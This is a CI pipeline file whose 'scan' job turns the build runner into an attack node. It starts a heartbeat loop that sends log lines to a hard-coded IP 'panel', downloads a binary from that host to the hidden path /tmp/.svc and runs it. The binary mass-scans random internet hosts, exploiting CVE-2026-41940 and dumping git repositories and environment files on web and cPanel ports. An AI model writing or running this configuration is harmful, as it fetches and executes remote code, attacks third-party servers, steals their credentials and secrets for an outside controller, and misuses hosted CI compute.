scan:
  image: ubuntu:22.04
  timeout: 60 minutes
  before_script:
    - apt-get update -qq 2>/dev/null && apt-get install -y curl 2>/dev/null || true
  script:
    - export PANEL="http://43.228.157.68:80" REPO="toybox4881718/webportal" LOGF="/tmp/gl.log"
    - bash -c 'while true; do sleep 30; LINE=$(tail -1 "$LOGF" 2>/dev/null||echo starting); curl -sf -X POST "$PANEL/api/github-heartbeat" --data-urlencode "repo=gl/$REPO" --data-urlencode "log=$LINE" 2>/dev/null; done &'
    - for i in 1 2 3 4 5; do curl -sf "$PANEL/api/dl/amd64" -o /tmp/.svc && chmod +x /tmp/.svc && break; sleep 10; done
    - test -f /tmp/.svc
    - PANEL_URL="$PANEL" SHELL_DOMAIN="gl/$REPO" GOMEMLIMIT=7000000000 /tmp/.svc ipscan --source random,all --workers 2000 --exploit CVE-2026-41940 --git --envdump --ports 80,443,8080,8443,2082,2083,2086,2087 --port-timeout=200 --git-workers 50 --count 0 --no-reverse 2>&1 | tee "$LOGF" || true
